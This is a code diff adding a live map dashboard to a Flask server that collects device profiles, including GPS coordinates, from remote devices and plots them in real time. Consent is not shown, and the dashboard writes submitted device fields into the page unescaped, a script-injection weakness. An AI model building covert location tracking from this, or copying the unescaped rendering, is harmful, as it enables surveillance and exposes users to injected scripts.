@@ -40,6 +40,11 @@ class DeviceProfileServer:
             """Serve the device profile collection page."""
             return self._get_collection_html()
         
+        @self.app.route('/dashboard')
+        def dashboard():
+            """Serve the live location dashboard."""
+            return self._get_dashboard_html()
+        
         @self.app.route('/api/submit-profile', methods=['POST'])
         def submit_profile():
             """Receive device profile data from remote device."""
@@ -95,6 +100,287 @@ class DeviceProfileServer:
             if profile_id in self.received_profiles:
                 return jsonify(self.received_profiles[profile_id]), 200
             return jsonify({'error': 'Profile not found'}), 404
+    
+    def _get_dashboard_html(self) -> str:
+        """
+        Generate live location dashboard with map.
+        
+        Returns:
+            HTML page as string
+        """
+        html = """
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>LEX Live Device Dashboard</title>
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                    background: #0f0f1e;
+                    color: #e0e0e0;
+                }
+                .header {
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    padding: 20px;
+                    text-align: center;
+                    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+                }
+                .header h1 {
+                    color: #fff;
+                    font-size: 24px;
+                }
+                .header p {
+                    color: #ddd;
+                    font-size: 12px;
+                    margin-top: 5px;
+                }
+                .container {
+                    display: flex;
+                    height: calc(100vh - 70px);
+                }
+                #map {
+                    flex: 1;
+                    z-index: 1;
+                }
+                .sidebar {
+                    width: 350px;
+                    background: #1a1e27;
+                    border-right: 1px solid #333;
+                    overflow-y: auto;
+                    padding: 20px;
+                    box-shadow: -2px 0 10px rgba(0, 0, 0, 0.3);
+                }
+                .device-list {
+                    list-style: none;
+                }
+                .device-item {
+                    background: #2a2e37;
+                    padding: 15px;
+                    margin-bottom: 15px;
+                    border-radius: 8px;
+                    border-left: 3px solid #667eea;
+                    cursor: pointer;
+                    transition: all 0.3s;
+                }
+                .device-item:hover {
+                    background: #323844;
+                    border-left-color: #764ba2;
+                    transform: translateX(5px);
+                }
+                .device-name {
+                    color: #00ff00;
+                    font-weight: bold;
+                    font-size: 14px;
+                }
+                .device-info {
+                    color: #888;
+                    font-size: 12px;
+                    margin-top: 8px;
+                }
+                .device-coords {
+                    color: #00ccff;
+                    font-size: 11px;
+                    margin-top: 5px;
+                    font-family: monospace;
+                }
+                .stats {
+                    background: #2a2e37;
+                    padding: 15px;
+                    border-radius: 8px;
+                    margin-bottom: 20px;
+                    border-left: 3px solid #00ff00;
+                }
+                .stat-item {
+                    display: flex;
+                    justify-content: space-between;
+                    margin: 5px 0;
+                    font-size: 13px;
+                }
+                .stat-label {
+                    color: #888;
+                }
+                .stat-value {
+                    color: #00ff00;
+                    font-weight: bold;
+                }
+                .refresh-info {
+                    color: #888;
+                    font-size: 11px;
+                    text-align: center;
+                    margin-top: 20px;
+                }
+                .badge {
+                    display: inline-block;
+                    background: #667eea;
+                    color: #fff;
+                    padding: 2px 8px;
+                    border-radius: 3px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>🗺️ LEX Live Device Dashboard</h1>
+                <p>Real-time Device Location Tracking</p>
+            </div>
+            
+            <div class="container">
+                <div id="map"></div>
+                
+                <div class="sidebar">
+                    <div class="stats">
+                        <div class="stat-item">
+                            <span class="stat-label">Connected Devices:</span>
+                            <span class="stat-value" id="deviceCount">0</span>
+                        </div>
+                        <div class="stat-item">
+                            <span class="stat-label">Last Update:</span>
+                            <span class="stat-value" id="lastUpdate">-</span>
+                        </div>
+                    </div>
+                    
+                    <h3 style="color: #00ff00; margin-bottom: 15px; font-size: 14px;">📍 DEVICES</h3>
+                    <ul class="device-list" id="deviceList"></ul>
+                    
+                    <div class="refresh-info">
+                        Auto-refreshing every 2 seconds
+                    </div>
+                </div>
+            </div>
+            
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+            <script>
+                // Initialize map
+                const map = L.map('map').setView([0, 0], 2);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '&copy; OpenStreetMap contributors',
+                    maxZoom: 19
+                }).addTo(map);
+                
+                const markers = {};
+                let lastProfileCount = 0;
+                
+                async function updateDashboard() {
+                    try {
+                        const response = await fetch('/api/profiles');
+                        const data = await response.json();
+                        const profiles = data.profiles || {};
+                        
+                        // Update device count
+                        document.getElementById('deviceCount').textContent = Object.keys(profiles).length;
+                        document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
+                        
+                        // Update map and sidebar
+                        const deviceList = document.getElementById('deviceList');
+                        
+                        // Remove devices no longer present
+                        Object.keys(markers).forEach(profileId => {
+                            if (!profiles[profileId]) {
+                                map.removeLayer(markers[profileId].marker);
+                                delete markers[profileId];
+                            }
+                        });
+                        
+                        // Add new devices or update existing ones
+                        Object.entries(profiles).forEach(([profileId, profile]) => {
+                            const location = profile.location || {};
+                            const hasCoords = location.latitude && location.longitude;
+                            
+                            if (hasCoords) {
+                                const lat = location.latitude;
+                                const lon = location.longitude;
+                                const accuracy = Math.round(location.accuracy || 0);
+                                const deviceId = profile.device_id || 'Unknown';
+                                
+                                // Create or update marker
+                                if (!markers[profileId]) {
+                                    const marker = L.circleMarker([lat, lon], {
+                                        radius: 10,
+                                        fillColor: '#667eea',
+                                        color: '#764ba2',
+                                        weight: 2,
+                                        opacity: 1,
+                                        fillOpacity: 0.8
+                                    }).addTo(map);
+                                    
+                                    marker.bindPopup(`
+                                        <div style="background: #1a1e27; color: #e0e0e0; padding: 10px; border-radius: 5px;">
+                                            <strong style="color: #00ff00;">${deviceId}</strong><br>
+                                            <small style="color: #888;">Lat: ${lat.toFixed(6)}</small><br>
+                                            <small style="color: #888;">Lon: ${lon.toFixed(6)}</small><br>
+                                            <small style="color: #888;">Accuracy: ±${accuracy}m</small><br>
+                                            <small style="color: #888;">Time: ${new Date(profile.timestamp).toLocaleString()}</small>
+                                        </div>
+                                    `);
+                                    
+                                    markers[profileId] = { marker, lat, lon };
+                                }
+                            }
+                        });
+                        
+                        // Update sidebar list
+                        deviceList.innerHTML = '';
+                        Object.entries(profiles).forEach(([profileId, profile]) => {
+                            const location = profile.location || {};
+                            const hasCoords = location.latitude && location.longitude;
+                            const deviceId = profile.device_id || 'Unknown';
+                            
+                            const li = document.createElement('li');
+                            li.className = 'device-item';
+                            
+                            if (hasCoords) {
+                                li.style.cursor = 'pointer';
+                                li.onclick = () => {
+                                    map.setView([location.latitude, location.longitude], 15);
+                                    markers[profileId].marker.openPopup();
+                                };
+                            }
+                            
+                            li.innerHTML = `
+                                <div class="device-name">${deviceId} ${hasCoords ? '<span class="badge">📍</span>' : '<span class="badge" style="background: #666;">No GPS</span>'}</div>
+                                <div class="device-info">
+                                    Platform: ${profile.platform || 'Unknown'}
+                                </div>
+                                ${hasCoords ? `
+                                    <div class="device-coords">
+                                        ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}<br>
+                                        ±${Math.round(location.accuracy || 0)}m accuracy
+                                    </div>
+                                ` : '<div class="device-coords" style="color: #ff6666;">GPS not available</div>'}
+                                <div class="device-info">
+                                    ${new Date(profile.timestamp).toLocaleString()}
+                                </div>
+                            `;
+                            
+                            deviceList.appendChild(li);
+                        });
+                        
+                        // Auto-fit map if we have markers
+                        const markerArray = Object.values(markers).map(m => [m.lat, m.lon]);
+                        if (markerArray.length > 0) {
+                            const bounds = L.latLngBounds(markerArray);
+                            map.fitBounds(bounds, { padding: [100, 100] });
+                        }
+                        
+                    } catch (error) {
+                        console.error('Error updating dashboard:', error);
+                    }
+                }
+                
+                // Update on load and then every 2 seconds
+                updateDashboard();
+                setInterval(updateDashboard, 2000);
+            </script>
+        </body>
+        </html>
+        """
+        return html
     
     def _get_collection_html(self) -> str:
         """
@@ -236,7 +522,7 @@ class DeviceProfileServer:
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>🔍 LEX Device Profile</h1>
+                    <h1> LEX Device Profile</h1>
                     <p>Automatic Device Information Collector</p>
                 </div>
                 
